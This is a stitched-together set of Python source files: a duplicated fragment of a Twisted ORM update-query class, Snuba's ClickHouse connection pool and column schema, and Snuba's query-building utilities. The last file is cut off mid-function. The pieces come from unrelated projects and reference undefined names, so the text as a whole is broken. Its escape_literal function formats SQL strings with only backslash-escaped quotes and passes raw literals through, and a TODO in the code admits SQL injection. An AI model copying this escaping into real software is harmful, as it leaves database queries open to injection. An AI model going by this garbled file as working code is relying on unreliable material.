        if self.return_id:
            result = yield self.database.runQuery(query)                    
            if result and self.model_class._meta.primary_key:
                returnValue(result[0][0])
        else:
            yield self.database.runOperation(query)                    

        returnValue(None)

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from twisted.internet.defer import inlineCallbacks, returnValue

from base import Query

class UpdateQuery(Query):
    """
    Object representing an update query
    """

    def __init__(self, model_class, values):
        super(UpdateQuery, self).__init__(model_class)
        # Values to update
        self.values = values
        self.return_id = self.model_class._meta.primary_key

    @inlineCallbacks
    def execute(self):
        query = self.database.generate_update(self)                    

        # If return id. Use runQuery else use runOperation
        if self.return_id:
            result = yield self.database.runQuery(query)                    
            if result and self.model_class._meta.primary_key:
                returnValue(result[0][0])
        else:
            yield self.database.runOperation(query)                    

        returnValue(None)


import logging
import re
import time

from six.moves import queue, range

from clickhouse_driver import Client, errors

from snuba import settings


logger = logging.getLogger('snuba.clickhouse')


ESCAPE_RE = re.compile(r'^-?[a-zA-Z][a-zA-Z0-9_\.]*$')                    
NEGATE_RE = re.compile(r'^(-?)(.*)$')


def escape_col(col):
    if not col:
        return col
    elif ESCAPE_RE.match(col):                    
        return col
    else:
        return u'{}`{}`'.format(*NEGATE_RE.match(col).groups())


class ClickhousePool(object):
    def __init__(self,
                 host=settings.CLICKHOUSE_SERVER.split(':')[0],
                 port=int(settings.CLICKHOUSE_SERVER.split(':')[1]),
                 connect_timeout=1,
                 send_receive_timeout=300,
                 max_pool_size=settings.CLICKHOUSE_MAX_POOL_SIZE,
                 client_settings={},
                 metrics=None,
                 ):
        self.host = host
        self.port = port
        self.connect_timeout = connect_timeout
        self.send_receive_timeout = send_receive_timeout
        self.client_settings = client_settings
        self.metrics = metrics

        self.pool = queue.LifoQueue(max_pool_size)

        # Fill the queue up so that doing get() on it will block properly
        for _ in range(max_pool_size):
            self.pool.put(None)

    def execute(self, *args, **kwargs):
        try:
            conn = self.pool.get(block=True)

            # Lazily create connection instances
            if conn is None:
                conn = self._create_conn()

            try:
                return conn.execute(*args, **kwargs)
            except (errors.NetworkError, errors.SocketTimeoutError) as e:
                # Force a reconnection next time
                conn = None
                raise e
        finally:
            self.pool.put(conn, block=False)

    def execute_robust(self, *args, **kwargs):
        retries = 3
        while True:
            try:
                return self.execute(*args, **kwargs)
            except (errors.NetworkError, errors.SocketTimeoutError) as e:
                logger.warning("Write to ClickHouse failed: %s (%d retries)", str(e), retries)
                if retries <= 0:
                    raise
                retries -= 1

                if self.metrics:
                    self.metrics.increment('clickhouse.network-error')

                time.sleep(1)
                continue
            except errors.ServerException as e:
                logger.warning("Write to ClickHouse failed: %s (retrying)", str(e))
                if e.code == errors.ErrorCodes.TOO_MANY_SIMULTANEOUS_QUERIES:
                    if self.metrics:
                        self.metrics.increment('clickhouse.too-many-queries')

                    time.sleep(1)
                    continue
                else:
                    raise

    def _create_conn(self):
        return Client(
            host=self.host,
            port=self.port,
            connect_timeout=self.connect_timeout,
            send_receive_timeout=self.send_receive_timeout,
            settings=self.client_settings
        )

    def close(self):
        try:
            while True:
                conn = self.pool.get(block=False)
                if conn:
                    conn.disconnect()
        except queue.Empty:
            pass


class Column(object):
    def __init__(self, name, type):
        self.name = name
        self.type = type

    def __repr__(self):
        return 'Column({}, {})'.format(repr(self.name), repr(self.type))

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self.name == other.name \
            and self.type == other.type

    def for_schema(self):
        return '{} {}'.format(escape_col(self.name), self.type.for_schema())

    @staticmethod
    def to_columns(columns):
        return [
            Column(*col) if not isinstance(col, Column) else col
            for col in columns
        ]


class FlattenedColumn(object):
    def __init__(self, base_name, name, type):
        self.base_name = base_name
        self.name = name
        self.type = type

        self.flattened = '{}.{}'.format(self.base_name, self.name) if self.base_name else self.name
        self.escaped = escape_col(self.flattened)

    def __repr__(self):
        return 'FlattenedColumn({}, {}, {})'.format(
            repr(self.base_name), repr(self.name), repr(self.type)
        )

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self.flattened == other.flattened \
            and self.type == other.type


class ColumnType(object):
    def __repr__(self):
        return self.__class__.__name__ + '()'

    def __eq__(self, other):
        return self.__class__ == other.__class__

    def for_schema(self):
        return self.__class__.__name__

    def flatten(self, name):
        return [FlattenedColumn(None, name, self)]


class Nullable(ColumnType):
    def __init__(self, inner_type):
        self.inner_type = inner_type

    def __repr__(self):
        return u'Nullable({})'.format(repr(self.inner_type))

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self.inner_type == other.inner_type

    def for_schema(self):
        return u'Nullable({})'.format(self.inner_type.for_schema())


class Array(ColumnType):
    def __init__(self, inner_type):
        self.inner_type = inner_type

    def __repr__(self):
        return u'Array({})'.format(repr(self.inner_type))

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self.inner_type == other.inner_type

    def for_schema(self):
        return u'Array({})'.format(self.inner_type.for_schema())


class Nested(ColumnType):
    def __init__(self, nested_columns):
        self.nested_columns = Column.to_columns(nested_columns)

    def __repr__(self):
        return u'Nested({})'.format(repr(self.nested_columns))

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self.nested_columns == other.nested_columns

    def for_schema(self):
        return u'Nested({})'.format(u", ".join(
            column.for_schema() for column in self.nested_columns
        ))

    def flatten(self, name):
        return [
            FlattenedColumn(name, column.name, Array(column.type))
            for column in self.nested_columns
        ]


class String(ColumnType):
    pass


class FixedString(ColumnType):
    def __init__(self, length):
        self.length = length

    def __repr__(self):
        return 'FixedString({})'.format(self.length)

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self.length == other.length

    def for_schema(self):
        return 'FixedString({})'.format(self.length)


class UInt(ColumnType):
    def __init__(self, size):
        assert size in (8, 16, 32, 64)
        self.size = size

    def __repr__(self):
        return 'UInt({})'.format(self.size)

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self.size == other.size

    def for_schema(self):
        return 'UInt{}'.format(self.size)


class Float(ColumnType):
    def __init__(self, size):
        assert size in (32, 64)
        self.size = size

    def __repr__(self):
        return 'Float({})'.format(self.size)

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self.size == other.size

    def for_schema(self):
        return 'Float{}'.format(self.size)


class DateTime(ColumnType):
    pass


class ColumnSet(object):
    """\
    A set of columns, unique by column name.

    Initialized with a list of Column objects or
    (column_name: String, column_type: ColumnType) tuples.

    Offers simple functionality:
    * ColumnSets can be added together (order is maintained)
    * Columns can be looked up by ClickHouse normalized names, e.g. 'tags.key'
    * `for_schema()` can be used to generate valid ClickHouse column names
      and types for a table schema.
    """
    def __init__(self, columns):
        self.columns = Column.to_columns(columns)

        self._lookup = {}
        self._flattened = []
        for column in self.columns:
            self._flattened.extend(column.type.flatten(column.name))

        for col in self._flattened:
            if col.flattened in self._lookup:
                raise RuntimeError("Duplicate column: {}".format(col.flattened))

            self._lookup[col.flattened] = col
            # also store it by the escaped name
            self._lookup[col.escaped] = col

    def __repr__(self):
        return 'ColumnSet({})'.format(repr(self.columns))

    def __eq__(self, other):
        return self.__class__ == other.__class__ \
            and self._flattened == other._flattened

    def __len__(self):
        return len(self._flattened)

    def __add__(self, other):
        if isinstance(other, ColumnSet):
            return ColumnSet(self.columns + other.columns)
        return ColumnSet(self.columns + other)

    def __contains__(self, key):
        return key in self._lookup

    def __getitem__(self, key):
        return self._lookup[key]

    def __iter__(self):
        return iter(self._flattened)

    def get(self, key, default=None):
        try:
            return self[key]
        except KeyError:
            return default

    def for_schema(self):
        return ', '.join(column.for_schema() for column in self.columns)


METADATA_COLUMNS = ColumnSet([
    # optional stream related data
    ('offset', Nullable(UInt(64))),
    ('partition', Nullable(UInt(16))),
])

PROMOTED_TAG_COLUMNS = ColumnSet([
    # These are the classic tags, they are saved in Snuba exactly as they
    # appear in the event body.
    ('level', Nullable(String())),
    ('logger', Nullable(String())),
    ('server_name', Nullable(String())),  # future name: device_id?
    ('transaction', Nullable(String())),
    ('environment', Nullable(String())),
    ('sentry:release', Nullable(String())),
    ('sentry:dist', Nullable(String())),
    ('sentry:user', Nullable(String())),
    ('site', Nullable(String())),
    ('url', Nullable(String())),
])

PROMOTED_CONTEXT_TAG_COLUMNS = ColumnSet([
    # These are promoted tags that come in in `tags`, but are more closely
    # related to contexts.  To avoid naming confusion with Clickhouse nested
    # columns, they are stored in the database with s/./_/
    # promoted tags
    ('app_device', Nullable(String())),
    ('device', Nullable(String())),
    ('device_family', Nullable(String())),
    ('runtime', Nullable(String())),
    ('runtime_name', Nullable(String())),
    ('browser', Nullable(String())),
    ('browser_name', Nullable(String())),
    ('os', Nullable(String())),
    ('os_name', Nullable(String())),
    ('os_rooted', Nullable(UInt(8))),
])

PROMOTED_CONTEXT_COLUMNS = ColumnSet([
    ('os_build', Nullable(String())),
    ('os_kernel_version', Nullable(String())),
    ('device_name', Nullable(String())),
    ('device_brand', Nullable(String())),
    ('device_locale', Nullable(String())),
    ('device_uuid', Nullable(String())),
    ('device_model_id', Nullable(String())),
    ('device_arch', Nullable(String())),
    ('device_battery_level', Nullable(Float(32))),
    ('device_orientation', Nullable(String())),
    ('device_simulator', Nullable(UInt(8))),
    ('device_online', Nullable(UInt(8))),
    ('device_charging', Nullable(UInt(8))),
])

REQUIRED_COLUMNS = ColumnSet([
    ('event_id', FixedString(32)),
    ('project_id', UInt(64)),
    ('group_id', UInt(64)),
    ('timestamp', DateTime()),
    ('deleted', UInt(8)),
    ('retention_days', UInt(16)),
])

ALL_COLUMNS = REQUIRED_COLUMNS + [
    # required for non-deleted
    ('platform', Nullable(String())),
    ('message', Nullable(String())),
    ('primary_hash', Nullable(FixedString(32))),
    ('received', Nullable(DateTime())),

    # optional user
    ('user_id', Nullable(String())),
    ('username', Nullable(String())),
    ('email', Nullable(String())),
    ('ip_address', Nullable(String())),

    # optional geo
    ('geo_country_code', Nullable(String())),
    ('geo_region', Nullable(String())),
    ('geo_city', Nullable(String())),

    ('sdk_name', Nullable(String())),
    ('sdk_version', Nullable(String())),
    ('sdk_integrations', Array(String())),
    ('modules', Nested([
        ('name', String()),
        ('version', String()),
    ])),
    ('culprit', Nullable(String())),
    ('type', Nullable(String())),
    ('version', Nullable(String())),
] + METADATA_COLUMNS \
  + PROMOTED_CONTEXT_COLUMNS \
  + PROMOTED_TAG_COLUMNS \
  + PROMOTED_CONTEXT_TAG_COLUMNS \
  + [
    # other tags
    ('tags', Nested([
        ('key', String()),
        ('value', String()),
    ])),

    # other context
    ('contexts', Nested([
        ('key', String()),
        ('value', String()),
    ])),

    # interfaces

    # http interface
    ('http_method', Nullable(String())),
    ('http_referer', Nullable(String())),

    # exception interface
    ('exception_stacks', Nested([
        ('type', Nullable(String())),
        ('value', Nullable(String())),
        ('mechanism_type', Nullable(String())),
        ('mechanism_handled', Nullable(UInt(8))),
    ])),
    ('exception_frames', Nested([
        ('abs_path', Nullable(String())),
        ('filename', Nullable(String())),
        ('package', Nullable(String())),
        ('module', Nullable(String())),
        ('function', Nullable(String())),
        ('in_app', Nullable(UInt(8))),
        ('colno', Nullable(UInt(32))),
        ('lineno', Nullable(UInt(32))),
        ('stack_level', UInt(16)),
    ])),
]

# The set of columns, and associated keys that have been promoted
# to the top level table namespace.
PROMOTED_COLS = {
    'tags': frozenset(col.flattened for col in (PROMOTED_TAG_COLUMNS + PROMOTED_CONTEXT_TAG_COLUMNS)),
    'contexts': frozenset(col.flattened for col in PROMOTED_CONTEXT_COLUMNS),
}

# For every applicable promoted column,  a map of translations from the column
# name  we save in the database to the tag we receive in the query.
COLUMN_TAG_MAP = {
    'tags': {col.flattened: col.flattened.replace('_', '.') for col in PROMOTED_CONTEXT_TAG_COLUMNS},
    'contexts': {},
}

# And a reverse map from the tags the client expects to the database columns
TAG_COLUMN_MAP = {
    col: dict(map(reversed, trans.items())) for col, trans in COLUMN_TAG_MAP.items()
}

# The canonical list of foo.bar strings that you can send as a `tags[foo.bar]` query
# and they can/will use a promoted column.
PROMOTED_TAGS = {
    col: [COLUMN_TAG_MAP[col].get(x, x) for x in PROMOTED_COLS[col]]
    for col in PROMOTED_COLS
}


def get_table_definition(name, engine, columns=ALL_COLUMNS):
    return """
    CREATE TABLE IF NOT EXISTS %(name)s (%(columns)s) ENGINE = %(engine)s""" % {
        'columns': columns.for_schema(),
        'engine': engine,
        'name': name,
    }


def get_test_engine(
        order_by=settings.DEFAULT_ORDER_BY,
        partition_by=settings.DEFAULT_PARTITION_BY,
        version_column=settings.DEFAULT_VERSION_COLUMN,
        sample_expr=settings.DEFAULT_SAMPLE_EXPR):
    return """
        ReplacingMergeTree(%(version_column)s)
        PARTITION BY %(partition_by)s
        ORDER BY %(order_by)s
        SAMPLE BY %(sample_expr)s ;""" % {
        'order_by': settings.DEFAULT_ORDER_BY,
        'partition_by': settings.DEFAULT_PARTITION_BY,
        'version_column': settings.DEFAULT_VERSION_COLUMN,
        'sample_expr': settings.DEFAULT_SAMPLE_EXPR,
    }


def get_replicated_engine(
        name,
        order_by=settings.DEFAULT_ORDER_BY,
        partition_by=settings.DEFAULT_PARTITION_BY,
        version_column=settings.DEFAULT_VERSION_COLUMN,
        sample_expr=settings.DEFAULT_SAMPLE_EXPR):
    return """
        ReplicatedReplacingMergeTree('/clickhouse/tables/{shard}/%(name)s', '{replica}', %(version_column)s)
        PARTITION BY %(partition_by)s
        ORDER BY %(order_by)s
        SAMPLE BY %(sample_expr)s;""" % {
        'name': name,
        'order_by': order_by,
        'partition_by': partition_by,
        'version_column': version_column,
        'sample_expr': sample_expr,
    }


def get_distributed_engine(cluster, database, local_table,
                           sharding_key=settings.DEFAULT_SHARDING_KEY):
    return """Distributed(%(cluster)s, %(database)s, %(local_table)s, %(sharding_key)s);""" % {
        'cluster': cluster,
        'database': database,
        'local_table': local_table,
        'sharding_key': sharding_key,
    }


def get_local_table_definition():
    return get_table_definition(
        settings.DEFAULT_LOCAL_TABLE, get_replicated_engine(name=settings.DEFAULT_LOCAL_TABLE)
    )


def get_dist_table_definition():
    assert settings.CLICKHOUSE_CLUSTER, "CLICKHOUSE_CLUSTER is not set."

    return get_table_definition(
        settings.DEFAULT_DIST_TABLE,
        get_distributed_engine(
            cluster=settings.CLICKHOUSE_CLUSTER,
            database='default',
            local_table=settings.DEFAULT_LOCAL_TABLE,
        )
    )

from flask import request

from clickhouse_driver.errors import Error as ClickHouseError
from datetime import date, datetime, timedelta
from dateutil.parser import parse as dateutil_parse
from dateutil.tz import tz
from functools import wraps
from hashlib import md5
from itertools import chain, groupby
import jsonschema
import logging
import numbers
import re
import simplejson as json
import six
import _strptime  # fixes _strptime deferred import issue
import time

from snuba import clickhouse, schemas, settings, state
from snuba.clickhouse import escape_col, ALL_COLUMNS, PROMOTED_COLS, TAG_COLUMN_MAP, COLUMN_TAG_MAP


logger = logging.getLogger('snuba.util')


# A column name like "tags[url]"
NESTED_COL_EXPR_RE = re.compile('^(tags|contexts)\[([a-zA-Z0-9_\.:-]+)\]$')

# example partition name: "('2018-03-13 00:00:00', 90)"
PART_RE = re.compile(r"\('(\d{4}-\d{2}-\d{2})', (\d+)\)")
DATE_TYPE_RE = re.compile(r'(Nullable\()?Date\b')
DATETIME_TYPE_RE = re.compile(r'(Nullable\()?DateTime\b')
QUOTED_LITERAL_RE = re.compile(r"^'.*'$")


class InvalidConditionException(Exception):
    pass


class Literal(object):                    
    def __init__(self, literal):                    
        self.literal = literal                    


def to_list(value):
    return value if isinstance(value, list) else [value]


def string_col(col):
    col_type = ALL_COLUMNS.get(col, None)
    col_type = str(col_type) if col_type else None

    if col_type and 'String' in col_type and 'FixedString' not in col_type:
        return escape_col(col)
    else:
        return 'toString({})'.format(escape_col(col))


def parse_datetime(value, alignment=1):
    dt = dateutil_parse(value, ignoretz=True).replace(microsecond=0)
    return dt - timedelta(seconds=(dt - dt.min).seconds % alignment)


def column_expr(column_name, body, alias=None, aggregate=None):
    """
    Certain special column names expand into more complex expressions. Return
    a 2-tuple of:
        (expanded column expression, sanitized alias)

    Needs the body of the request for some extra data used to expand column expressions.
    """
    assert column_name or aggregate
    assert not aggregate or (aggregate and (column_name or alias))
    column_name = column_name or ''

    if isinstance(column_name, (tuple, list)) and isinstance(column_name[1], (tuple, list)):
        return complex_column_expr(column_name, body)
    elif isinstance(column_name, six.string_types) and QUOTED_LITERAL_RE.match(column_name):
        return escape_literal(column_name[1:-1])
    elif column_name == settings.TIME_GROUP_COLUMN:
        expr = settings.TIME_GROUPS[body['granularity']]
    elif NESTED_COL_EXPR_RE.match(column_name):
        expr = tag_expr(column_name)
    elif column_name in ['tags_key', 'tags_value']:
        expr = tags_expr(column_name, body)
    elif column_name == 'issue':
        expr = 'group_id'
    else:
        expr = escape_col(column_name)

    if aggregate:
        if expr:
            expr = u'{}({})'.format(aggregate, expr)
            if aggregate == 'uniq':  # default uniq() result to 0, not null
                expr = 'ifNull({}, 0)'.format(expr)
        else:  # This is the "count()" case where the '()' is already provided
            expr = aggregate

    alias = escape_col(alias or column_name)

    return alias_expr(expr, alias, body)


def complex_column_expr(expr, body, depth=0):
    # TODO instead of the mutual recursion between column_expr and complex_column_expr
    # we should probably encapsulate all this logic in a single recursive column_expr
    if depth == 0:
        # we know the first item is a function
        ret = expr[0]
        expr = expr[1:]

        # if the last item of the toplevel is a string, it's an alias
        alias = None
        if len(expr) > 1 and isinstance(expr[-1], six.string_types):
            alias = expr[-1]
            expr = expr[:-1]
    else:
        # is this a nested function call?
        if len(expr) > 1 and isinstance(expr[1], tuple):
            ret = expr[0]
            expr = expr[1:]
        else:
            ret = ''

    # emptyIfNull(col) is a simple pseudo function supported by Snuba that expands
    # to the actual clickhouse function ifNull(col, '') Until we figure out the best
    # way to disambiguate column names from string literals in complex functions.
    if ret == 'emptyIfNull' and len(expr) >= 1 and isinstance(expr[0], tuple):
        ret = 'ifNull'
        expr = (expr[0] + (Literal('\'\''),),) + expr[1:]                    

    first = True
    for subexpr in expr:
        if isinstance(subexpr, tuple):
            ret += '(' + complex_column_expr(subexpr, body, depth + 1) + ')'
        else:
            if not first:
                ret += ', '
            if isinstance(subexpr, six.string_types):
                ret += column_expr(subexpr, body)
            else:
                ret += escape_literal(subexpr)
        first = False

    if depth == 0 and alias:
        return alias_expr(ret, alias, body)

    return ret


def alias_expr(expr, alias, body):
    """
    Return the correct expression to use in the final SQL. Keeps a cache of
    the previously created expressions and aliases, so it knows when it can
    subsequently replace a redundant expression with an alias.

    1. If the expression and alias are equal, just return that.
    2. Otherwise, if the expression is new, add it to the cache and its alias so
       it can be reused later and return `expr AS alias`
    3. If the expression has been aliased before, return the alias
    """
    alias_cache = body.setdefault('alias_cache', [])

    if expr == alias:
        return expr
    elif alias in alias_cache:
        return alias
    else:
        alias_cache.append(alias)
        return u'({} AS {})'.format(expr, alias)


def tag_expr(column_name):
    """
    Return an expression for the value of a single named tag.

    For tags/contexts, we expand the expression depending on whether the tag is
    "promoted" to a top level column, or whether we have to look in the tags map.
    """
    col, tag = NESTED_COL_EXPR_RE.match(column_name).group(1, 2)

    # For promoted tags, return the column name.
    if col in PROMOTED_COLS:
        actual_tag = TAG_COLUMN_MAP[col].get(tag, tag)
        if actual_tag in PROMOTED_COLS[col]:
            return string_col(actual_tag)

    # For the rest, return an expression that looks it up in the nested tags.
    return u'{col}.value[indexOf({col}.key, {tag})]'.format(**{
        'col': col,
        'tag': escape_literal(tag)
    })


def tags_expr(column_name, body):
    """
    Return an expression that array-joins on tags to produce an output with one
    row per tag.
    """
    assert column_name in ['tags_key', 'tags_value']
    col, k_or_v = column_name.split('_', 1)
    nested_tags_only = state.get_config('nested_tags_only', 1)

    # Generate parallel lists of keys and values to arrayJoin on
    if nested_tags_only:
        key_list = '{}.key'.format(col)
        val_list = '{}.value'.format(col)
    else:
        promoted = PROMOTED_COLS[col]
        col_map = COLUMN_TAG_MAP[col]
        key_list = u'arrayConcat([{}], {}.key)'.format(
            u', '.join(u'\'{}\''.format(col_map.get(p, p)) for p in promoted),
            col
        )
        val_list = u'arrayConcat([{}], {}.value)'.format(
            ', '.join(string_col(p) for p in promoted),
            col
        )

    cols_used = all_referenced_columns(body) & set(['tags_key', 'tags_value'])
    if len(cols_used) == 2:
        # If we use both tags_key and tags_value in this query, arrayjoin
        # on (key, value) tag tuples.
        expr = (u'arrayJoin(arrayMap((x,y) -> [x,y], {}, {}))').format(
            key_list,
            val_list
        )

        # put the all_tags expression in the alias cache so we can use the alias
        # to refer to it next time (eg. 'all_tags[1] AS tags_key'). instead of
        # expanding the whole tags expression again.
        expr = alias_expr(expr, 'all_tags', body)
        return u'({})[{}]'.format(expr, 1 if k_or_v == 'key' else 2)
    else:
        # If we are only ever going to use one of tags_key or tags_value, don't
        # bother creating the k/v tuples to arrayJoin on, or the all_tags alias
        # to re-use as we won't need it.
        return 'arrayJoin({})'.format(key_list if k_or_v == 'key' else val_list)


def is_condition(cond_or_list):
    return (
        # A condition is:
        # a 3-tuple
        len(cond_or_list) == 3 and
        # where the middle element is an operator
        cond_or_list[1] in schemas.CONDITION_OPERATORS and
        # and the first element looks like a column name or expression
        isinstance(cond_or_list[0], (six.string_types, tuple, list))
    )


def all_referenced_columns(body):
    """
    Return the set of all columns that are used by a query.
    """
    col_exprs = []

    # These fields can reference column names
    for field in ['arrayjoin', 'groupby', 'orderby', 'selected_columns']:
        if field in body:
            col_exprs.extend(to_list(body[field]))

    # Conditions need flattening as they can be nested as AND/OR
    if 'conditions' in body:
        flat_conditions = list(chain(*[[c] if is_condition(c) else c for c in body['conditions']]))
        col_exprs.extend([c[0] for c in flat_conditions])

    if 'aggregations' in body:
        col_exprs.extend([a[1] for a in body['aggregations']])

    # Return the set of all columns referenced in any expression
    return set(chain(*[columns_in_expr(ex) for ex in col_exprs]))


def columns_in_expr(expr):
    """
    Get the set of columns that are referenced by a single column expression.
    Either it is a simple string with the column name, or a nested function
    that could reference multiple columns
    """
    cols = []
    # TODO possibly exclude quoted args to functions as those are
    # string literals, not column names.
    if isinstance(expr, six.string_types):
        cols.append(expr.lstrip('-'))
    elif (isinstance(expr, (list, tuple)) and len(expr) >= 2
          and isinstance(expr[1], (list, tuple))):
        for func_arg in expr[1]:
            cols.extend(columns_in_expr(func_arg))
    return cols


def tuplify(nested):
    if isinstance(nested, (list, tuple)):
        return tuple(tuplify(child) for child in nested)
    return nested


def conditions_expr(conditions, body, depth=0):
    """
    Return a boolean expression suitable for putting in the WHERE clause of the
    query.  The expression is constructed by ANDing groups of OR expressions.
    Expansion of columns is handled, as is replacement of columns with aliases,
    if the column has already been expanded and aliased elsewhere.
    """
    if not conditions:
        return ''

    if depth == 0:
        sub = (conditions_expr(cond, body, depth + 1) for cond in conditions)
        return u' AND '.join(s for s in sub if s)
    elif is_condition(conditions):
        lhs, op, lit = conditions

        if (
            lhs in ('received', 'timestamp') and
            op in ('>', '<', '>=', '<=', '=', '!=') and
            isinstance(lit, str)
        ):
            lit = parse_datetime(lit)

        # If the LHS is a simple column name that refers to an array column
        # (and we are not arrayJoining on that column, which would make it
        # scalar again) and the RHS is a scalar value, we assume that the user
        # actually means to check if any (or all) items in the array match the
        # predicate, so we return an `any(x == value for x in array_column)`
        # type expression. We assume that operators looking for a specific value
        # (IN, =, LIKE) are looking for rows where any array value matches, and
        # exclusionary operators (NOT IN, NOT LIKE, !=) are looking for rows
        # where all elements match (eg. all NOT LIKE 'foo').
        if (
            isinstance(lhs, six.string_types) and
            lhs in ALL_COLUMNS and
            type(ALL_COLUMNS[lhs].type) == clickhouse.Array and
            ALL_COLUMNS[lhs].base_name != body.get('arrayjoin') and
            not isinstance(lit, (list, tuple))
            ):
            any_or_all = 'arrayExists' if op in schemas.POSITIVE_OPERATORS else 'arrayAll'
            return u'{}(x -> assumeNotNull(x {} {}), {})'.format(
                any_or_all,
                op,
                escape_literal(lit),
                column_expr(lhs, body)
            )
        else:
            return u'{} {} {}'.format(
                column_expr(lhs, body),
                op,
                escape_literal(lit)
            )

    elif depth == 1:
        sub = (conditions_expr(cond, body, depth + 1) for cond in conditions)
        sub = [s for s in sub if s]
        res = u' OR '.join(sub)
        return u'({})'.format(res) if len(sub) > 1 else res
    else:
        raise InvalidConditionException(str(conditions))


def escape_literal(value):
    """
    Escape a literal value for use in a SQL clause                    
    """
    # TODO in both the Literal and the raw string cases, we need to
    # sanitize the string from potential SQL injection.
    if isinstance(value, Literal):                    
        return value.literal                    
    elif isinstance(value, six.string_types):                    
        value = value.replace("'", "\\'")                    
        return u"'{}'".format(value)
    elif isinstance(value, datetime):
        value = value.replace(tzinfo=None, microsecond=0)
        return "toDateTime('{}')".format(value.isoformat())
    elif isinstance(value, date):
        return "toDate('{}')".format(value.isoformat())
    elif isinstance(value, (list, tuple)):
        return u"({})".format(', '.join(escape_literal(v) for v in value))
    elif isinstance(value, numbers.Number):
        return str(value)
    elif value is None:
        return ''
    else:
        raise ValueError(u'Do not know how to escape {} for SQL'.format(type(value)))


def raw_query(body, sql, client, timer, stats=None):
    """
    Submit a raw SQL query to clickhouse and do some post-processing on it to
    fix some of the formatting issues in the result JSON
    """
    project_ids = to_list(body['project'])
    project_id = project_ids[0] if project_ids else 0  # TODO rate limit on every project in the list?
    stats = stats or {}
    grl, gcl, prl, pcl, use_cache = state.get_configs([
        ('global_per_second_limit', 1000),
        ('global_concurrent_limit', 1000),
        ('project_per_second_limit', 1000),
        ('project_concurrent_limit', 1000),
        ('use_cache', 0),
    ])

    # Specific projects can have their rate limits overridden
    prl, pcl = state.get_configs([
        ('project_per_second_limit_{}'.format(project_id), prl),
        ('project_concurrent_limit_{}'.format(project_id), pcl),
    ])

    all_confs = six.iteritems(state.get_all_configs())
    query_settings = {k.split('/', 1)[1]: v for k, v in all_confs if k.startswith('query_settings/')}

    timer.mark('get_configs')

    query_id = md5(force_bytes(sql)).hexdigest()
    with state.deduper(query_id) as is_dupe:
        timer.mark('dedupe_wait')

        result = state.get_result(query_id) if use_cache else None
        timer.mark('cache_get')

        stats.update({
            'is_duplicate': is_dupe,
            'query_id': query_id,
            'use_cache': bool(use_cache),
            'cache_hit': bool(result)}
        ),

        if result:
            status = 200
        else:
            with state.rate_limit('global', grl, gcl) as (g_allowed, g_rate, g_concurr):
                metrics.gauge('query.global_concurrent', g_concurr)
                stats.update({'global_rate': g_rate, 'global_concurrent': g_concurr})

                with state.rate_limit(project_id, prl, pcl) as (p_allowed, p_rate, p_concurr):
                    stats.update({'project_rate': p_rate, 'project_concurrent': p_concurr})
                    timer.mark('rate_limit')

                    if g_allowed and p_allowed:

                        # Experiment, reduce max threads by 1 for each extra concurrent query
                        # that a project has running beyond the first one
                        if 'max_threads' in query_settings and p_concurr > 1:
                            maxt = query_settings['max_threads']
                            query_settings['max_threads'] = max(1, maxt - p_concurr + 1)

                        try:
                            data, meta = client.execute(
                                sql,
                                with_column_types=True,
                                settings=query_settings,
                                # All queries should already be deduplicated at this point
                                # But the query_id will let us know if they aren't
                                query_id=query_id
                            )
                            data, meta = scrub_ch_data(data, meta)
                            status = 200
                            if body.get('totals', False):
                                assert len(data) > 0
                                data, totals = data[:-1], data[-1]
                                result = {'data': data, 'meta': meta, 'totals': totals}
                            else:
                                result = {'data': data, 'meta': meta}

                            logger.debug(sql)
                            timer.mark('execute')
                            stats.update({
                                'result_rows': len(data),
                                'result_cols': len(meta),
                            })

                            if use_cache:
                                state.set_result(query_id, result)
                                timer.mark('cache_set')

                        except BaseException as ex:
                            error = six.text_type(ex)
                            status = 500
                            logger.error("Error running query: %s\n%s", sql, error)
                            if isinstance(ex, ClickHouseError):
                                result = {'error': {
                                    'type': 'clickhouse',
                                    'code': ex.code,
                                    'message': error,
                                }}
                            else:
                                result = {'error': {
                                    'type': 'unknown',
                                    'message': error,
                                }}

                    else:
                        status = 429
                        result = {'error': {
                            'type': 'ratelimit',
                            'message': 'rate limit exceeded',
                        }}

    stats.update(query_settings)
    state.record_query({
        'request': body,
        'sql': sql,
        'timing': timer,
        'stats': stats,
        'status': status,
    })

    if settings.RECORD_QUERIES:
        timer.send_metrics_to(metrics)
    result['timing'] = timer

    if settings.STATS_IN_RESPONSE or body.get('debug', False):
        result['stats'] = stats
        result['sql'] = sql

    return (result, status)


def scrub_ch_data(data, meta):
    # for now, convert back to a dict-y format to emulate the json
    data = [{c[0]: d[i] for i, c in enumerate(meta)} for d in data]
    meta = [{'name': m[0], 'type': m[1]} for m in meta]

    for col in meta:
        # Convert naive datetime strings back to TZ aware ones, and stringify
        # TODO maybe this should be in the json serializer
        if DATETIME_TYPE_RE.match(col['type']):
            for d in data:
                d[col['name']] = d[col['name']].replace(tzinfo=tz.tzutc()).isoformat()
        elif DATE_TYPE_RE.match(col['type']):
            for d in data:
